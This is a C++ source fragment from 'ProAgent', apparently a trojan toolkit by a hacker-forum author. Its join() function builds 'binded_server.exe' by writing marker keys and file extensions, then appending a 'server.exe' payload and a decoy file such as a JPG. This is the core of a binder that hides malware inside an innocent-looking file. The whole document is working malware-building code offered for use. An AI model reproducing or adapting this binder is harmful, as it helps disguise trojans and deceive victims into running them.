/*===================================
ProAgent coded By ATmaCA
http://www.atmacasoft.com
atmaca@prohack.net
===================================*/
AnsiString uzanti_bul(AnsiString path)
{
AnsiString uzanti;
uzanti=ExtractFileExt(ExtractFileName(path));
uzanti.c_str()[0]=' ';
uzanti=uzanti.Trim();
if(uzanti.Length()!=3)
{
return "-1";
}
return uzanti;
}
//////////////////////////////////////////////////////////////////
bool join(char uzanti1[4],char uzanti2[2],AnsiString path2)
{
AnsiString path_main=ExtractFilePath(Application->ExeName)+"binded_server.exe";
AnsiString server=ExtractFilePath(Application->ExeName)+"server.exe";
//char uzanti1[3];
//char uzanti2[3];
//////////////////silinecek...
//char uzanti1[4]={'e','x','e',NULL};
//char uzanti2[4]={'j','p','g',NULL};
////////////////////////////silenecek...
FILE *di,*di1,*di2;
char kr;
int i;
if((di=fopen(path_main.c_str(),"a+b")) == NULL)
{
//ShowMessage("1");
return false;
}
char key1[9]={'a','t','m','a','c','a','7','9',NULL};
char key2[9]={'f','o','t','i','n','i','7','8',NULL};
fprintf(di,"%s%s%s",key1,uzanti1,uzanti2);

if((di1=fopen(server.c_str(),"rb")) == NULL)
{
fclose(di);
//ShowMessage("2");
return false;
}

 while(!feof(di1))
      {
        kr=getc(di1);           //out2 yaziliyor
        putc(kr,di);
      };
      fclose(di1);

if((di2=fopen(path2.c_str(),"rb")) == NULL)
{
fclose(di);
//ShowMessage("3");
return false;
}

fprintf(di,"%s",key2);
 while(!feof(di2))
      {
        kr=getc(di2);           //out2 yaziliyor
        putc(kr,di);
      };
      fclose(di2);

fclose(di);
return true;
}